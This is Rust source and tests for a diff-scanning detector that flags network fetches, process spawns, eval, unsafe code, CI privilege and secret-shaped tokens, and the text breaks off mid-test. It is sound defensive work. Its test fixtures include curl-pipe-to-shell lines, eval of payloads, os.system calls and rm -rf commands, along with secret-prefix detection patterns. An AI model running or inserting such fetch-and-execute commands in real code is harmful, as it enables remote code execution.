/// `open` or it is never closed. `text` is a code view, so a delimiter in a string is blank.
/// Before, the first `)` ended the parameters, and a default value that calls a function hid an
/// empty handler (review V3 round 2, VD3R2-L-1).
fn after_closing(text: &str, open: u8, close: u8) -> Option<&str> {
    if text.as_bytes().first() != Some(&open) {
        return None;
    }
    let mut depth = 0usize;
    for (at, byte) in text.bytes().enumerate() {
        if byte == open {
            depth += 1;
        } else if byte == close {
            depth -= 1;
            if depth == 0 {
                return text.get(at + 1..);
            }
        }
    }
    None
}

/// Whether a JS line loads one of `modules` (`node:` optional) with `require(…)` (also
/// `module.require`), `import(…)`, `import …` or `from …`. The keyword and the opening quote must
/// be code in `code` (the line's code view), so a comment or a string that mentions an import
/// does not count; the specifier is read from `raw` at the same offset. A type-only statement
/// (`import type`, `export type`) and `typeof import(…)` load nothing and do not count
/// (`typeof require(…)` still calls `require`); an
/// `import(…)` type annotation does (it errs toward evidence).
fn imports_module(code: &str, raw: &str, modules: &[&str]) -> bool {
    let c = code.as_bytes();
    let specifier_at = |at: usize, keyword: &str| -> Option<&str> {
        let before = &code[..at];
        let receiver_ok = at == 0
            || !is_boundary_blocker(c[at - 1])
            || (keyword == "require" && before.ends_with("module."));
        let after = at + keyword.len();
        if !receiver_ok
            || c.get(after).is_some_and(|b| is_ident(*b))
            || (keyword == "import" && before.trim_end().ends_with("typeof"))
        {
            return None;
        }
        // Whitespace and any number of `(` may sit between the keyword and the specifier.
        let gap = c[after..]
            .iter()
            .take_while(|b| b.is_ascii_whitespace() || **b == b'(')
            .count();
        let q = after + gap;
        if keyword == "require" && !c[after..q].contains(&b'(') {
            return None;
        }
        let quote = *c.get(q).filter(|b| matches!(b, b'"' | b'\'' | b'`'))?;
        let name = raw.get(q + 1..)?;
        let name = &name[..name.find(char::from(quote))?];
        Some(name.strip_prefix("node:").unwrap_or(name))
    };
    // Every keyword hit in line order, so one forward walk knows which statement each is in
    // and the type-only test runs once per statement: the line stays linear.
    let mut hits: Vec<(usize, &str)> = ["require", "import", "from"]
        .iter()
        .flat_map(|keyword| code.match_indices(keyword).map(|(at, _)| (at, *keyword)))
        .collect();
    hits.sort_unstable();
    // `start` is where the current statement begins; only the bytes since the last hit are
    // searched for a later `;`.
    let (mut seen, mut start, mut type_only) = (0, 0, None);
    hits.into_iter().any(|(at, keyword)| {
        if let Some(semi) = code[seen..at].rfind(';') {
            start = seen + semi + 1;
            type_only = None;
        }
        seen = at;
        let skip = *type_only.get_or_insert_with(|| {
            let head = code[start..].trim_start();
            head.starts_with("import type ") || head.starts_with("export type ")
        });
        !skip && specifier_at(at, keyword).is_some_and(|m| modules.contains(&m))
    })
}

fn token_in(text: &str, token: &str) -> bool {
    match token.strip_suffix('*') {
        // A prefix token: a boundary before it, none required after.
        Some(prefix) => text
            .match_indices(prefix)
            .any(|(i, _)| i == 0 || !is_boundary_blocker(text.as_bytes()[i - 1])),
        None => has_token(text, token),
    }
}

/// A private key header, or a cloud, forge or chat token by its fixed prefix and length.
/// The token itself is never copied into evidence: only its line number is.
#[must_use]
fn looks_like_secret(text: &str) -> bool {
    if text.contains("-----BEGIN") && text.contains("PRIVATE KEY") {
        return true;
    }
    let tail = |prefix: &str, min: usize, ok: fn(u8) -> bool| {
        text.match_indices(prefix).any(|(i, _)| {
            let before = i.checked_sub(1).map(|j| text.as_bytes()[j]);
            let boundary = before.is_none_or(|b| !b.is_ascii_alphanumeric());
            let run = text.as_bytes()[i + prefix.len()..]
                .iter()
                .take_while(|b| ok(**b))
                .count();
            boundary && run >= min
        })
    };
    let upper_digit = |b: u8| b.is_ascii_uppercase() || b.is_ascii_digit();
    let alnum = |b: u8| b.is_ascii_alphanumeric();
    let slack = |b: u8| b.is_ascii_alphanumeric() || b == b'-';
    tail("AKIA", 16, upper_digit)
        || ["ghp_", "gho_", "ghs_", "ghu_", "ghr_"]
            .iter()
            .any(|p| tail(p, 36, alnum))
        || ["xoxb-", "xoxp-", "xoxa-", "xoxr-"]
            .iter()
            .any(|p| tail(p, 10, slack))
        || tail("sk_live_", 16, alnum)
}

#[cfg(test)]
mod tests {
    use super::*;
    use deep_diff_forge_patch::parse;

    /// One file whose single hunk keeps a context line `x` and adds (`+`) or removes (`-`)
    /// `lines` after it.
    fn changed(path: &str, sign: char, lines: &[&str]) -> ReviewFile {
        let n = lines.len() + 1;
        let header = if sign == '+' {
            format!("@@ -1,1 +1,{n} @@")
        } else {
            format!("@@ -1,{n} +1,1 @@")
        };
        let mut text = format!("--- a/{path}\n+++ b/{path}\n{header}\n x\n");
        for line in lines {
            text.push(sign);
            text.push_str(line);
            text.push('\n');
        }
        parse(&text).unwrap().remove(0)
    }

    fn added(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '+', lines)
    }

    fn removed(path: &str, lines: &[&str]) -> ReviewFile {
        changed(path, '-', lines)
    }

    fn signals(file: &ReviewFile) -> Vec<EvidenceSignal> {
        file_evidence(file).iter().map(|e| e.signal).collect()
    }

    /// A path and the line a rule's token would appear on in that language.
    fn sample_path(scope: Scope) -> &'static str {
        match scope {
            Scope::Languages(languages) => match languages[0] {
                Language::Rust => "src/x.rs",
                Language::Python => "x.py",
                Language::JavaScript => "x.ts",
                Language::Go => "x.go",
                Language::Shell => "x.sh",
                Language::Yaml => "x.yml",
            },
            Scope::Any => "notes.txt",
            Scope::CiWorkflow => ".github/workflows/ci.yml",
            Scope::BuildScript => "build.rs",
            Scope::PackageJson => "package.json",
        }
    }

    fn sample_token(token: &str) -> String {
        match token.strip_suffix('*') {
            Some(prefix) => format!("{prefix}_case()"),
            None => format!("{token} x"),
        }
    }

    /// N8: every token in the table has a case that finds it, on the side the rule reads.
    #[test]
    fn every_token_in_the_table_is_found() {
        for rule in RULES {
            if let Match::Imports(modules) = rule.matches {
                for module in modules {
                    let line = format!("const m = require(\"{module}\");");
                    let file = added(sample_path(rule.scope), &[&line]);
                    assert!(signals(&file).contains(&rule.signal), "{module}");
                }
            }
            let Match::Tokens(tokens) = rule.matches else {
                continue;
            };
            for token in tokens {
                let path = sample_path(rule.scope);
                let line = sample_token(token);
                let file = match rule.side {
                    Side::New => added(path, &[&line]),
                    Side::Old => removed(path, &[&line]),
                };
                assert!(
                    signals(&file).contains(&rule.signal),
                    "{} not found for {token:?} in {path}",
                    rule.signal.label()
                );
            }
        }
    }

    /// The same tokens in a comment or a string are not code.
    #[test]
    fn a_token_in_a_comment_or_string_is_not_code() {
        for (path, lines) in [
            (
                "src/x.rs",
                &[
                    "// unsafe Command::new",
                    "let s = \"unsafe { Command::new }\";",
                    "/* unsafe",
                ][..],
            ),
            (
                "x.py",
                &[
                    "# subprocess.run eval(",
                    "s = 'os.system(x)'",
                    "\"\"\"",
                    "eval(x)",
                    "\"\"\"",
                ][..],
            ),
            (
                "x.ts",
                &["// child_process eval(", "const s = `fetch(${u})`;"][..],
            ),
            ("x.go", &["// exec.Command(", "s := \"http.Get(\""][..]),
            ("x.sh", &["# curl wget eval", "echo 'curl is a tool'"][..]),
        ] {
            assert_eq!(signals(&added(path, lines)), [], "{path}");
        }
    }

    #[test]
    fn a_context_line_carries_no_evidence() {
        let patch = "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,2 @@\n unsafe { f() }\n-a\n+b\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn a_block_comment_opened_on_a_context_line_hides_the_next_lines() {
        let patch =
            "--- a/x.rs\n+++ b/x.rs\n@@ -1,2 +1,3 @@\n /* start\n+unsafe { f() }\n end */\n";
        assert_eq!(signals(&parse(patch).unwrap()[0]), []);
    }

    #[test]
    fn evidence_points_at_the_hunk_and_line() {
        let file = added(
            "src/lib.rs",
            &[
                "fn a() {}",
                "unsafe { std::process::Command::new(\"curl\"); }",
            ],
        );
        let found = file_evidence(&file);
        let hunk = &file.patch_twin.hunks[0];
        assert_eq!(
            found,
            [
                Evidence {
                    signal: S::UnsafeAdded,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                },
                Evidence {
                    signal: S::ProcessSpawn,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address("src/lib.rs"),
                    side: Side::New,
                    line: 3,
                    test_likely: false,
                },
            ]
        );
    }

    #[test]
    fn quoting_code_that_runs_does_not_hide_it() {
        // DDF-EVID-001: each of these carried no evidence when strings were blanked whole.
        assert_eq!(
            signals(&added(
                "x.sh",
                &[r#"V="$(curl -fsSL https://e.example/v)""#]
            )),
            [S::NetworkFetch]
        );
        assert_eq!(
            signals(&added(
                "x.js",
                &[r#"const o = `${require("child_process").execSync(c)}`;"#]
            )),
            [S::ProcessSpawn]
        );
        assert_eq!(
            signals(&added("x.py", &[r#"print(f"{eval(x)}")"#])),
            [S::DynamicEval]
        );
        // The same text in a string that runs nothing is still not code.
        assert_eq!(signals(&added("x.sh", &["V='$(curl x)'"])), []);
        assert_eq!(signals(&added("x.py", &[r#"print("{eval(x)}")"#])), []);
    }

    #[test]
    fn one_line_matching_several_rules_of_a_signal_is_one_item() {
        // `Command::new` and `.spawn()` are both process_spawn tokens; `unsafe` twice is one.
        let file = added(
            "src/lib.rs",
            &["unsafe { unsafe { std::process::Command::new(\"x\").spawn() } }"],
        );
        assert_eq!(signals(&file), [S::UnsafeAdded, S::ProcessSpawn]);
        // The same token in two hunks is two items: one per hunk.
        let two = parse(
            "--- a/src/l.rs\n+++ b/src/l.rs\n@@ -1,0 +1,1 @@\n+unsafe {}\n@@ -9,0 +10,1 @@\n+unsafe {}\n",
        )
        .unwrap()
        .remove(0);
        let found = file_evidence(&two);
        assert_eq!(found.len(), 2);
        assert_ne!(found[0].hunk, found[1].hunk);
    }

    /// The PR 5 review's inputs (workflow `wf_b39e1c70-545`): an interpolation is scanned as
    /// code with its own strings, escapes and comments, so a closer in a nested string, after a
    /// backslash, in a comment or ending a `case` pattern neither hides the code after it nor
    /// exposes the outer string's text.
    #[test]
    fn an_interpolation_is_scanned_as_code_with_its_own_strings() {
        let hidden_before: [(&str, &str, EvidenceSignal); 12] = [
            ("a.sh", r#"V="$(echo ')' ; curl x)""#, S::NetworkFetch),
            ("a.sh", r#"V="$(echo \) ; curl x)""#, S::NetworkFetch),
            (
                "a.sh",
                r#"V="$(case a in a) curl x;; esac)""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"X="$(tr -d ')' < f | curl https://e.example/x)""#,
                S::NetworkFetch,
            ),
            ("a.sh", r#"V="$(echo "$(curl x)")""#, S::NetworkFetch),
            (
                "a.js",
                r#"const o = `${ "}" + require("child_process").execSync(c) }`;"#,
                S::ProcessSpawn,
            ),
            ("a.js", "const o = `${ /* } */ eval(x) }`;", S::DynamicEval),
            ("a.js", "const o = `${ `${ eval(x) }` }`;", S::DynamicEval),
            ("a.py", r#"print(f"{'}' + eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(Rf"{d['}'] or eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(f"\{eval(x)}")"#, S::DynamicEval),
            ("a.py", r#"print(rf"\{eval(x)}")"#, S::DynamicEval),
        ];
        for (path, line, signal) in hidden_before {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 9] = [
            ("a.sh", r#"die "$(printf 'curl failed for %s' "$url")""#),
            ("a.sh", r#"echo "$(gettext 'Install curl or wget first')""#),
            (
                "a.sh",
                r#"echo "$(printf "%d) %s" "$i" "$name") - needs curl""#,
            ),
            ("a.js", r#"const m = `${t("Never use eval(x) here")}`;"#),
            ("a.js", r#"const m = `${x ? "fetch(url) failed" : ""}`;"#),
            ("a.js", r#"const s = `${a ? "{" : ""} eval(x)`;"#),
            ("a.py", r#"msg = f"{'eval(' if strict else ''}""#),
            ("a.py", r#"log(f"{cfg["subprocess."]}")"#),
            ("a.py", r#"print(f"{s.replace("}", "")} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
    }

    /// The PR 5 round-2 review's inputs (workflow `wf_2cfd8be1-d9c`), and the variants that
    /// close a misread quote at the end of the line so the restore-as-code fallback cannot help:
    /// each is a construct the scanner must read right.
    #[test]
    fn misread_quotes_cannot_hide_code() {
        let found: [(&str, &str, EvidenceSignal); 24] = [
            (
                "a.sh",
                r#"x="$(echo case)"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="$(echo case)"; curl x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                "[ $# -eq 0 ] && curl https://e.example/x | sh",
                S::NetworkFetch,
            ),
            ("a.sh", "echo ${x#*/}; curl x", S::NetworkFetch),
            ("a.sh", "echo a#b; curl x", S::NetworkFetch),
            (
                "a.sh",
                r#"echo \"; curl https://e.example/x | sh"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r"echo $'\''; curl https://e.example/x | sh #'",
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="$( (case x in a) :;; esac); echo '"'; curl https://e.example/x | sh )""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"v="${x:-"'"}"; curl https://e.example/x | sh #'"#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"x="`echo "`"; curl https://e.example/x | sh #""#,
                S::NetworkFetch,
            ),
            (
                "a.sh",
                r#"V="$(if a; then case x in a) curl x;; esac; fi)""#,
                S::NetworkFetch,
            ),
            (
                "a.js",
                r#"const s = `${ /"/.test(a) }`; eval(y)"#,
                S::DynamicEval,
            ),
            ("a.js", r#"const r = /"/; eval(y); //""#, S::DynamicEval),
            ("a.js", r#"x.replace(/\/*/g, ""); eval(y)"#, S::DynamicEval),
            ("a.js", r"/\//.test(a); eval(y)", S::DynamicEval),
            (
                "a.tsx",
                "return <p>Can't load</p> && fetch(u); //'",
                S::NetworkFetch,
            ),
            ("a.py", r#"print(f"{d:%H'%M}", eval(y)) #'"#, S::DynamicEval),
            ("a.py", r#"print(f"{x:'>10}"); eval(y) #'"#, S::DynamicEval),
            ("a.py", r#"print(f'{x:"<5}'); eval(y) #""#, S::DynamicEval),
            ("a.py", r#"x = t"{eval('print(123)')}""#, S::DynamicEval),
            (
                "a.py",
                r#"print(f"{'''it's'''}"); eval(y) #'"#,
                S::DynamicEval,
            ),
            (
                "a.js",
                "const cp = require(`child_process`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"const cp = require( "child_process" );"#,
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r#"import{exec}from"child_process";import "node:child_process";"#,
                S::ProcessSpawn,
            ),
        ];
        for (path, line, signal) in found {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        let literal_only: [(&str, &str); 12] = [
            (
                "a.sh",
                r#"echo "Matches: $(grep --ignore-case -c todo notes.txt) (fetch more with curl)""#,
            ),
            ("a.sh", r#"echo "Mode: $(echo $case) - install curl first""#),
            ("a.js", r#"// const cp = require("child_process");"#),
            (
                "a.js",
                r#"throw new Error("Do not require('child_process') in the browser bundle");"#,
            ),
            (
                "a.js",
                r#"const help = `Use ${cmd} or require("child_process") yourself`;"#,
            ),
            ("a.js", "const re = /from 'child_process'/;"),
            (
                "a.ts",
                r#"import type { ChildProcess } from "node:child_process";"#,
            ),
            ("a.ts", "export type { SpawnOptions } from 'child_process';"),
            ("a.ts", r#"type Cp = typeof import("node:child_process");"#),
            (
                "a.js",
                r#"const m = `${s.match(/^{/) ? "obj" : "arr"} - see fetch(url) docs`;"#,
            ),
            ("a.py", r#"print(f"{x:'^5}", 'eval(y)')"#),
            ("a.py", r#"print(f"{d[a:b]!r:>{w}} then eval(x) it")"#),
        ];
        for (path, line) in literal_only {
            assert_eq!(signals(&added(path, &[line])), [], "{path}: {line}");
        }
        // A JSDoc example inside a block comment is not an import.
        let doc = added(
            "a.js",
            &[
                "/**",
                " * @example import { exec } from 'node:child_process';",
                " */",
            ],
        );
        assert_eq!(signals(&doc), []);
    }

    /// The PR 5 round-3 review's inputs (workflow `wf_fdfaa98c-6b0`) that real code can contain:
    /// shell `case` in every command position, `esac` as a pattern word, nested arms, JS regexes
    /// after operators and keywords, quotes after keywords, and the import forms.
    #[test]
    fn shell_case_js_regex_and_import_forms_are_read_right() {
        let fetch = "curl https://e.example/x | sh";
        for line in [
            format!(r#"V="$(if case a in a) true;; esac; then :; fi; {fetch})""#),
            format!(r#"V="$(while case a in b) true;; esac; do break; done; {fetch})""#),
            format!(r#"V="$(! case a in b) true;; esac; {fetch})""#),
            format!(r#"V="$(time case a in b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in b|esac) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) case b in b) :;; esac;; c) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) :; esac=1;; b) :;; esac; {fetch})""#),
            format!(r#"V="$(case a in a) echo ${{esac}};; b) :;; esac; {fetch})""#),
            format!("echo $(date)#; {fetch}"),
        ] {
            assert_eq!(
                signals(&added("a.sh", &[&line])),
                [S::NetworkFetch],
                "{line}"
            );
        }
        for line in [
            "x = a + /'/.source; eval(y) //'",
            "x = typeof' ' ; eval(y) //'",
            r#"function f(){return"//"+eval(x)}"#,
            "x = a++ / 2; eval(y); z = b / 3",
        ] {
            assert_eq!(signals(&added("a.js", &[line])), [S::DynamicEval], "{line}");
        }
        // A quote after `return` opens a string, so its `/*` is not a comment that hides the
        // next line.
        let next = added("a.js", &[r#"function f(){return"/*"}"#, "eval(x)"]);
        assert_eq!(signals(&next), [S::DynamicEval]);
        for (path, line) in [
            ("a.js", "const cp = require(\t\"child_process\");"),
            ("a.js", r#"const cp = module.require("child_process");"#),
            ("a.js", r#"const cp = require(("child_process"));"#),
            (
                "a.ts",
                r#"export type T = 1; const cp = require("child_process");"#,
            ),
            ("a.js", r#"const o = { m: import("child_process") };"#),
            // A type annotation loads nothing, but it is counted: the rule errs toward evidence.
            (
                "a.ts",
                r#"let p: import("child_process").ChildProcess | undefined;"#,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [S::ProcessSpawn], "{line}");
        }
        for line in [
            r#"echo "Ran: $(basename ${case}) - fetch the logs with curl""#,
            r#"echo "$(case $1 in (a) echo x;; esac) - install curl first""#,
        ] {
            assert_eq!(signals(&added("a.sh", &[line])), [], "{line}");
        }
    }

    /// The final PR 5 review's regressions against main (workflow `wf_bbb5e9f1-254`): common
    /// code the branch misread, and lines that made the import rule quadratic.
    #[test]
    fn common_typescript_continuations_and_raw_strings_keep_their_evidence() {
        for (path, line, signal) in [
            (
                "n.ts",
                "const pct = (stats.get(key)! / total) * 100; const res = await fetch(`/api/stats/${key}`);",
                S::NetworkFetch,
            ),
            (
                "n.ts",
                r#"const ms = timings[name]! / 1000; void fetch("/log", { method: "POST" });"#,
                S::NetworkFetch,
            ),
            (
                "n.ts",
                "const pct = done! / total; const out = execSync(`du -sh ${dir}/`);",
                S::ProcessSpawn,
            ),
            (
                "a.js",
                r"const run = cmd => /^'/.test(cmd) ? null : execSync(cmd, { shell: '/bin/sh' });",
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r#"let root = Path::new(r"C:\"); let out = Command::new("cmd").output()?;"#,
                S::ProcessSpawn,
            ),
            (
                "src/a.rs",
                r##"let s = r#"a "quoted" \"#; unsafe { f() }"##,
                S::UnsafeAdded,
            ),
            (
                "src/a.rs",
                r#"let b = br"\"; unsafe { f() }"#,
                S::UnsafeAdded,
            ),
        ] {
            assert_eq!(signals(&added(path, &[line])), [signal], "{path}: {line}");
        }
        // A line that continues an expression with `/` divides; one after `=` opens a regex.
        let divided = added(
            "m3.js",
            &[
                "const elapsed = (Date.now() - start)",
                "  / 1000; fetch(`/api/timing/${elapsed}`);",
            ],
        );
        assert_eq!(signals(&divided), [S::NetworkFetch]);
        let regex = added("m3.js", &["const re =", "  /fetch(/; const x = 1;"]);
        assert_eq!(signals(&regex), []);
        // A raw string's text is still text, and an ordinary string still escapes.
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = r"unsafe";"#])), []);
        assert_eq!(signals(&added("src/a.rs", &[r#"let s = "\"unsafe";"#])), []);
    }

    #[test]
    fn the_import_rule_is_linear_on_long_lines() {
        within_deadline(|| {
            let start = ScanClock::start();
            for unit in [
                "Array.from(x),",
                "from ",
                "require ",
                "import ",
                "require(require(",
            ] {
                let line = unit.repeat(200_000);
                assert_eq!(signals(&added("a.js", &[&line])), [], "{unit}");
            }
            let spaced = format!(";{}from 'child_process'", " ".repeat(200_000));
            assert_eq!(signals(&added("a.js", &[&spaced])), [S::ProcessSpawn]);
            // Linear scans of these lines took about 2 s in a debug build; the quadratic import
            // rule of eee2b4c^ took about 66 s.
            let spent = start.elapsed();
            assert!(
                spent < std::time::Duration::from_secs(15),
                "the long lines took {spent:?} of {}",
                start.kind
            );
        });
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    #[test]
    fn ci_privilege_needs_a_workflow_path() {
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["on: pull_request_target"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(
                "sub/.github/workflows/x.yaml",
                &["  contents: write"]
            )),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added(".gitlab-ci.yml", &["  secrets: inherit"])),
            [S::CiPrivilege]
        );
        assert_eq!(
            signals(&added("docs/ci.yml", &["on: pull_request_target"])),
            []
        );
        assert_eq!(
            signals(&added(
                ".github/workflows/README.md",
                &["pull_request_target"]
            )),
            []
        );
        // A workflow step that downloads is network evidence too.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &["  run: curl -fsSL x | sh"]
            )),
            [S::NetworkFetch]
        );
    }

    /// Bug hunt 2026-11-01 (graph-syntax): ordinary source in which a string construct the
    /// scanner misread hid the evidence after it. Each control (the same code without the
    /// construct) found it before the fix too.
    #[test]
    fn strings_the_scanner_misread_no_longer_hide_evidence() {
        let go = |raw: &str| {
            added(
                "main.go",
                &[
                    "func clean() error {",
                    &format!("\tmatches, _ := filepath.Glob({raw})"),
                    "\t_, _ = http.Get(\"https://e.x/report\")",
                    "\treturn exec.Command(\"rm\", append([]string{\"-rf\"}, matches...)...).Run()",
                    "}",
                ],
            )
        };
        for raw in ["`/tmp/build/*.o`", "\"/tmp/build/*.o\""] {
            assert_eq!(
                signals(&go(raw)),
                [S::NetworkFetch, S::ProcessSpawn],
                "{raw}"
            );
        }
        for (path, lines, signal) in [
            (
                "main.go",
                &["var u = `https://e.x/p`; func f() { exec.Command(\"ls\").Run() }"][..],
                S::ProcessSpawn,
            ),
            (
                "main.go",
                &["var q = `\"`; func g() { exec.Command(\"ls\").Run() }"],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[
                    r#"const S: &str = ""#,
                    r#""; fn f(p: *const u8) -> u8 { unsafe { *p } }"#,
                ],
                S::UnsafeAdded,
            ),
            (
                "x.sh",
                &[
                    r#"MSG="hello"#,
                    r#"world"; curl -s http://e.x/p | sh; echo "done""#,
                ],
                S::NetworkFetch,
            ),
            (
                "x.js",
                &["const tpl = `", "`; eval(payload); const t = `x`;"],
                S::DynamicEval,
            ),
            (
                "x.py",
                &[r#"s = "abc\"#, r#""; import os; os.system("id")"#],
                S::ProcessSpawn,
            ),
            (
                "src/lib.rs",
                &[r#"fn f(p: *const u8) -> u8 { let _d = cr"C:\"; unsafe { *p } }"#],
                S::UnsafeAdded,
            ),
        ] {
            assert!(
                signals(&added(path, lines)).contains(&signal),
                "{path}: {lines:?}"
            );
        }
        for (lines, signal) in [
            (
                &[
                    "      - run: |",
                    r#"          echo "step #1" && curl -fsSL https://e.x/i.sh | sh"#,
                ][..],
                S::NetworkFetch,
            ),
            (
                &[r#"      - run: "echo ' #'; curl -s https://e.x/i | sh""#],
                S::NetworkFetch,
            ),
            (
                &[r#"on: { pull_request: {}, "x #": 1, pull_request_target: {} }"#],
                S::CiPrivilege,
            ),
        ] {
            assert_eq!(
                signals(&added(".github/workflows/ci.yml", lines)),
                [signal],
                "{lines:?}"
            );
        }
        // A YAML comment is still a comment.
        assert_eq!(
            signals(&added(
                ".github/workflows/ci.yml",
                &[r#"  name: "build" # curl x | sh, pull_request_target"#]
            )),
            []
        );
    }

    /// Review 2026-11-01 (graph-syntax): a Go hunk that opens inside a cobra raw help string.
    /// The apostrophe in `It's` was read as an opener and carried down the hunk until the glob's
    /// `/*` opened a block comment over the `http.Get` and `exec.Command` after it. Without the
    /// `don't panic` line, and before strings were carried, both were found.
    #[test]
    fn a_misread_opener_in_context_hides_no_later_evidence() {
        let patch = |println: bool| {
            let mut added = vec![
                "\t\tmatches, _ := filepath.Glob(\"/tmp/build/*.o\")",
                "\t\t_, _ = http.Get(\"https://e.x/ping\")",
                "\t\treturn exec.Command(\"rm\", matches...).Run()",
            ];
            if println {
                added.insert(0, "\t\tfmt.Println(\"don't panic\")");
            }
            let mut text = format!(
                "--- a/cmd/clean.go\n+++ b/cmd/clean.go\n@@ -1,3 +1,{} @@\n",
                3 + added.len()
            );
            for context in [
                "It's safe to run twice.",
                "`,",
                "\tRunE: func(cmd *cobra.Command, args []string) error {",
            ] {
                text.push(' ');
                text.push_str(context);
                text.push('\n');
            }
            for line in added {
                text.push('+');
                text.push_str(line);
                text.push('\n');
            }
            parse(&text).unwrap().remove(0)
        };
        for println in [false, true] {
            assert_eq!(
                signals(&patch(println)),
                [S::NetworkFetch, S::ProcessSpawn],
                "println: {println}"
            );
        }
    }

    #[test]
    fn build_scripts_and_install_hooks_are_build_hooks() {
        assert_eq!(
            signals(&added("build.rs", &["fn main() {}"])),
            [S::BuildHook]
        );
        assert_eq!(signals(&added("build.rs", &["// only a comment", ""])), []);
        assert_eq!(
            signals(&added("sub/setup.py", &["setup(name='x')"])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"postinstall\": \"node x\","])),
            [S::BuildHook]
        );
        assert_eq!(
            signals(&added("package.json", &["  \"name\": \"install-helper\","])),
            []
        );
    }

    #[test]
    fn secrets_are_found_by_shape_and_never_copied() {
        // Built at run time, so the repository's own secret scan never sees a token here.
        let aws = format!("key = \"AKIA{}\"", "Q7".repeat(8));
        let forge = format!("t='ghp_{}'", "a1".repeat(18));
        let chat = format!("# xoxb-{}", "12345-abcde");
        let stripe = format!("sk_live_{}", "Z".repeat(16));
        let header = format!("-----BEGIN {} PRIVATE KEY-----", "RSA");
        for line in [&aws, &forge, &chat, &stripe, &header] {
            assert_eq!(
                signals(&added("notes.txt", &[line])),
                [S::SecretLike],
                "{line}"
            );
        }
        for line in [
